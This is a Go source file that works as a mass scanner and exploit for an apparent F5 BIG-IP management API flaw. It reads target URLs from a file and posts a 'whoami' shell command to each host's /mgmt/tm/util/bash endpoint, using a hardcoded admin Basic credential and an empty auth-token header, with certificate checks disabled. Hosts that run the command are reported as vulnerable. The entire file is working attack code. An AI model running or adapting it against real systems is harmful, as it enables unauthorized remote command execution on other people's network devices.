package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var filename=flag.String("f","","input filename")
func Read(res *http.Response) {
	content := make(map[string]string)
	body,err:=ioutil.ReadAll(res.Body)
	if err!=nil{
		fmt.Println("bad body")
	}
	err=json.Unmarshal(body,&content)
	if err!=nil{
		fmt.Println("unmarshal err")
	}else {
		fmt.Print(content)
		fmt.Println()
	}
}
func main() {
	flag.Parse()
	if len(*filename)==0{
		fmt.Println("please input filename")
		os.Exit(1)
	}
	dataByte,err:=ioutil.ReadFile(*filename)
	if err!=nil{
		fmt.Println("fail to open file")
		os.Exit(1)
	}
	dataSlice:=strings.Split(strings.TrimSpace(string(dataByte)),"\r\n")
	proxy := func(_ *http.Request) (*url.URL, error) {
		return url.Parse(strings.TrimSpace("http://127.0.0.1:8080"))
	}
	client:=&http.Client{
		Timeout:time.Duration(5)*time.Second,
		Transport:&http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:                  proxy,
		}}

	for _,url:=range dataSlice{
		data:=make(map[string]string)
		data["command"]="run"
		data["utilCmdArgs"]="-c whoami"
		byteData,err:=json.Marshal(data)
		if err!=nil{
			return
		}
		temp:=bytes.NewReader(byteData)
		requ,err:=http.NewRequest("POST",url+"/mgmt/tm/util/bash",temp)
		if err!=nil{
			continue
		}
		requ.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0")
		requ.Header.Set("Content-Type", "application/json")
		requ.Header.Add("Authorization","Basic YWRtaW46QVNhc1M=")
		requ.Header.Add("X-F5-Auth-Token","")
		res,err:=client.Do(requ)
		if err!=nil{
			fmt.Println("send request failed")
			continue
		}
		defer res.Body.Close()
		if res.StatusCode>=200 && res.StatusCode<300{
			fmt.Print(url+" : ")
			Read(res)
		}else {
			fmt.Println(url+" not vul")
		}
	}
}
